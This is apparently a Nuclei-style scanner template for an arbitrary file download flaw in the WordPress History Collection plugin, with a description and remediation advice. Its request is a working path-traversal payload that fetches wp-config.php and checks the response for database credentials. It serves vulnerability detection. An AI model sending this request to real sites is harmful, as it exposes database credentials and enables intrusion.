id: CNVD-2015-04041
info:
  name: Wordpress History Collection <=1.1.1 Arbitraty File Download
  author:
  - l0ne1y
  description: |-
    WordPress Plugin History Collection Arbitrary File Download Vulnerability
    WordPress is a blog platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers.

    There is an arbitrary file download vulnerability in the WordPress History Collectio plug-in, which allows remote attackers to use the vulnerability to submit special requests to download arbitrary files.
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://hr.wordpress.org/plugins/history-collection/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    dsl:
    - ' contains(body,"define") && contains(body,"DB_USER") && status_code==200'
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php'
  method: GET
